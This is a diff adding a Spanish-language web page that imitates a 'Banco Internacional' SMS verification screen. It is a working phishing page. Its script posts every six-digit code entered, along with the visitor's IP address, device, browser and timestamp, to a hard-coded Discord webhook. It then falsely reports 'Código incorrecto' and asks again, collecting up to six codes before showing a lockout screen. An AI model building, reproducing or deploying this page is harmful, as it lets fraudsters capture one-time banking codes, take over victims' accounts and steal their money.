@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco Internacional</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      background-color: #F5A81C;
+      display: flex;
+      justify-content: center;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+      min-height: 100vh;
+      background-color: #F5A81C;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 28px 40px;
+      position: relative;
+    }
+
+    .back-arrow {
+      position: absolute;
+      top: 24px; left: 20px;
+      font-size: 26px; color: white;
+      cursor: pointer; text-decoration: none;
+      font-weight: 200; line-height: 1;
+    }
+
+    .logo-area {
+      margin-top: 18px;
+      display: flex;
+      justify-content: center;
+    }
+    .logo-area img { width: 210px; object-fit: contain; }
+
+    .illustration { width: 100%; margin-top: 14px; }
+    .illustration img { width: 100%; display: block; object-fit: contain; }
+
+    /* Card */
+    .card {
+      width: 100%;
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .card-title {
+      color: white;
+      font-size: 17px;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .card-sub {
+      color: rgba(255,255,255,0.75);
+      font-size: 13px;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    /* 6-digit boxes */
+    .boxes {
+      display: flex;
+      gap: 10px;
+      margin-top: 18px;
+    }
+
+    .box {
+      width: 44px;
+      height: 54px;
+      background: rgba(220,148,10,0.55);
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: white;
+      transition: border-color 0.2s, background 0.2s;
+      cursor: default;
+      user-select: none;
+    }
+
+    .box.active {
+      border-color: white;
+      background: rgba(220,148,10,0.8);
+    }
+
+    .box.filled {
+      border-color: rgba(255,255,255,0.6);
+    }
+
+    .box.error {
+      border-color: #ff6b6b;
+      background: rgba(255,80,80,0.25);
+      animation: shake 0.4s ease;
+    }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      20%      { transform: translateX(-5px); }
+      40%      { transform: translateX(5px); }
+      60%      { transform: translateX(-4px); }
+      80%      { transform: translateX(4px); }
+    }
+
+    /* Hidden real input */
+    #hiddenInput {
+      position: absolute;
+      opacity: 0;
+      width: 1px;
+      height: 1px;
+      pointer-events: none;
+    }
+
+    /* Status message */
+    .status {
+      min-height: 20px;
+      font-size: 13px;
+      color: rgba(255,255,255,0.9);
+      text-align: center;
+      margin-top: 6px;
+      transition: opacity 0.3s;
+    }
+
+    .status.error-msg { color: #ffadad; }
+    .status.blocked-msg { color: #ffd6a5; }
+
+    /* Countdown ring */
+    .countdown-wrap {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      margin-top: 4px;
+    }
+    .countdown-wrap.visible { display: flex; }
+
+    .countdown-circle {
+      position: relative;
+      width: 56px;
+      height: 56px;
+    }
+
+    .countdown-circle svg {
+      transform: rotate(-90deg);
+      width: 56px;
+      height: 56px;
+    }
+
+    .countdown-circle svg circle.bg {
+      fill: none;
+      stroke: rgba(255,255,255,0.2);
+      stroke-width: 4;
+    }
+
+    .countdown-circle svg circle.fill {
+      fill: none;
+      stroke: white;
+      stroke-width: 4;
+      stroke-linecap: round;
+      stroke-dasharray: 138.2;
+      stroke-dashoffset: 0;
+      transition: stroke-dashoffset 1s linear;
+    }
+
+    .countdown-number {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .countdown-label {
+      color: rgba(255,255,255,0.7);
+      font-size: 12px;
+    }
+
+    /* Confirm button */
+    .btn-confirmar {
+      width: 100%;
+      height: 56px;
+      background-color: #FFF0CC;
+      border: none;
+      border-radius: 32px;
+      color: #B87800;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 28px;
+      transition: background 0.2s, transform 0.1s, opacity 0.2s;
+    }
+    .btn-confirmar:hover:not(:disabled) { background: #ffe4a0; transform: scale(1.01); }
+    .btn-confirmar:active:not(:disabled) { transform: scale(0.98); }
+    .btn-confirmar:disabled { opacity: 0.45; cursor: not-allowed; }
+
+    /* Final block message */
+    .final-msg {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .final-msg.visible { display: flex; }
+
+    .final-msg .icon { font-size: 40px; }
+
+    .final-msg p {
+      color: white;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    .btn-reintentar {
+      width: 100%;
+      height: 52px;
+      background: rgba(255,255,255,0.2);
+      border: 2px solid rgba(255,255,255,0.5);
+      border-radius: 32px;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-reintentar:hover { background: rgba(255,255,255,0.3); }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <a href="index.html" class="back-arrow">&#8249;</a>
+
+  <div class="logo-area">
+    <img src="logo.webp" alt="Banco Internacional" />
+  </div>
+
+  <div class="illustration">
+    <img src="sentada.png" alt="" />
+  </div>
+
+  <!-- Normal flow -->
+  <div class="card" id="mainCard">
+    <p class="card-title">Ingresa tu código</p>
+    <p class="card-sub">Para validar tu identidad hemos enviado<br>un código a tu celular registrado</p>
+
+    <div class="boxes" id="boxes">
+      <div class="box" id="b0"></div>
+      <div class="box" id="b1"></div>
+      <div class="box" id="b2"></div>
+      <div class="box" id="b3"></div>
+      <div class="box" id="b4"></div>
+      <div class="box" id="b5"></div>
+    </div>
+
+    <input type="tel" id="hiddenInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code"/>
+
+    <div class="status" id="statusMsg"></div>
+
+    <div class="countdown-wrap" id="countdownWrap">
+      <div class="countdown-circle">
+        <svg viewBox="0 0 48 48">
+          <circle class="bg" cx="24" cy="24" r="22"/>
+          <circle class="fill" cx="24" cy="24" r="22" id="circleFill"/>
+        </svg>
+        <div class="countdown-number" id="countdownNum">10</div>
+      </div>
+      <span class="countdown-label">segundos para reintentar</span>
+    </div>
+
+    <button class="btn-confirmar" id="btnConfirmar" onclick="confirmar()">Confirmar</button>
+  </div>
+
+  <!-- Final blocked message -->
+  <div class="final-msg" id="finalMsg">
+    <div class="icon">🔒</div>
+    <p>Has superado el número de intentos permitidos.<br>Por favor vuelve a intentarlo más tarde.</p>
+    <button class="btn-reintentar" onclick="window.location.href='index.html'">Volver al inicio</button>
+  </div>
+
+</div>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW";
+  const MAX_INTENTOS = 6;
+  const WAIT_SECS    = 10;
+  const CIRCUM       = 2 * Math.PI * 22; // ~138.2
+
+  let intentos  = 0;
+  let bloqueado = false;
+  let valor     = '';
+
+  const input      = document.getElementById('hiddenInput');
+  const btnConf    = document.getElementById('btnConfirmar');
+  const statusMsg  = document.getElementById('statusMsg');
+  const cdWrap     = document.getElementById('countdownWrap');
+  const cdNum      = document.getElementById('countdownNum');
+  const circleFill = document.getElementById('circleFill');
+  const mainCard   = document.getElementById('mainCard');
+  const finalMsg   = document.getElementById('finalMsg');
+
+  // Focus hidden input on tap anywhere
+  document.getElementById('boxes').addEventListener('click', () => input.focus());
+  document.querySelector('.card-title') && document.addEventListener('click', (e) => {
+    if (!bloqueado) input.focus();
+  });
+
+  // Sync input to boxes
+  input.addEventListener('input', () => {
+    // Only digits
+    input.value = input.value.replace(/\D/g, '').slice(0, 6);
+    valor = input.value;
+    renderBoxes();
+    clearError();
+  });
+
+  function renderBoxes(state) {
+    for (let i = 0; i < 6; i++) {
+      const box = document.getElementById('b' + i);
+      box.textContent = valor[i] ? '•' : '';
+      box.className = 'box';
+      if (state === 'error') {
+        box.classList.add('error');
+      } else if (valor[i]) {
+        box.classList.add(i === valor.length - 1 ? 'active' : 'filled');
+      } else if (i === valor.length) {
+        box.classList.add('active');
+      }
+    }
+  }
+
+  function clearError() {
+    if (!bloqueado) {
+      statusMsg.textContent = '';
+      statusMsg.className = 'status';
+    }
+  }
+
+  async function getIP() {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      return d.ip || 'Desconocida';
+    } catch { return 'Desconocida'; }
+  }
+
+  async function sendToDiscord(codigo, intento) {
+    const ip     = await getIP();
+    const agente = navigator.userAgent;
+    const fecha  = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+    let dispositivo = 'Desconocido';
+    if      (/iPhone/i.test(agente))  dispositivo = '📱 iPhone';
+    else if (/Android/i.test(agente)) dispositivo = '📱 Android';
+    else if (/iPad/i.test(agente))    dispositivo = '📱 iPad';
+    else if (/Windows/i.test(agente)) dispositivo = '💻 Windows';
+    else if (/Mac/i.test(agente))     dispositivo = '💻 Mac';
+    else if (/Linux/i.test(agente))   dispositivo = '💻 Linux';
+
+    let navegador = 'Desconocido';
+    if      (/Edg/i.test(agente))       navegador = 'Edge';
+    else if (/OPR|Opera/i.test(agente)) navegador = 'Opera';
+    else if (/Chrome/i.test(agente))    navegador = 'Chrome';
+    else if (/Firefox/i.test(agente))   navegador = 'Firefox';
+    else if (/Safari/i.test(agente))    navegador = 'Safari';
+
+    const payload = {
+      username: "Banco Internacional",
+      embeds: [{
+        title: "🔢 Código ingresado",
+        color: 0xF5A81C,
+        fields: [
+          { name: "🔑 Código",      value: codigo,      inline: true },
+          { name: "🔁 Intento",     value: `${intento} / ${MAX_INTENTOS}`, inline: true },
+          { name: "\u200b",         value: "\u200b",    inline: false },
+          { name: "🌐 IP",          value: ip,          inline: true },
+          { name: "📍 Dispositivo", value: dispositivo, inline: true },
+          { name: "🖥️ Navegador",   value: navegador,   inline: true },
+          { name: "🕐 Fecha",       value: fecha,       inline: false }
+        ],
+        footer: { text: "Banco Internacional · Código" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e) {}
+  }
+
+  async function confirmar() {
+    if (bloqueado) return;
+    if (valor.length < 6) {
+      statusMsg.textContent = 'Ingresa los 6 dígitos.';
+      statusMsg.className = 'status error-msg';
+      return;
+    }
+
+    intentos++;
+    await sendToDiscord(valor, intentos);
+
+    if (intentos >= MAX_INTENTOS) {
+      // Show final blocked screen
+      mainCard.style.display = 'none';
+      finalMsg.classList.add('visible');
+      return;
+    }
+
+    // Wrong code flow: block for 10s
+    bloqueado = true;
+    btnConf.disabled = true;
+    input.blur();
+
+    renderBoxes('error');
+    statusMsg.textContent = 'Código incorrecto.';
+    statusMsg.className = 'status error-msg';
+
+    // Show countdown
+    cdWrap.classList.add('visible');
+    let remaining = WAIT_SECS;
+    cdNum.textContent = remaining;
+    circleFill.style.strokeDashoffset = '0';
+
+    const tick = setInterval(() => {
+      remaining--;
+      cdNum.textContent = remaining;
+      const offset = CIRCUM * (1 - remaining / WAIT_SECS);
+      circleFill.style.strokeDashoffset = offset;
+
+      if (remaining <= 0) {
+        clearInterval(tick);
+        // Unblock
+        bloqueado = false;
+        btnConf.disabled = false;
+        cdWrap.classList.remove('visible');
+        circleFill.style.strokeDashoffset = '0';
+        statusMsg.textContent = 'Puedes intentarlo de nuevo.';
+        statusMsg.className = 'status';
+        // Clear boxes
+        input.value = '';
+        valor = '';
+        renderBoxes();
+        input.focus();
+      }
+    }, 1000);
+  }
+
+  // Allow Enter key
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') confirmar();
+  });
+
+  // Init
+  renderBoxes();
+  setTimeout(() => input.focus(), 300);
+</script>
+</body>
+</html>
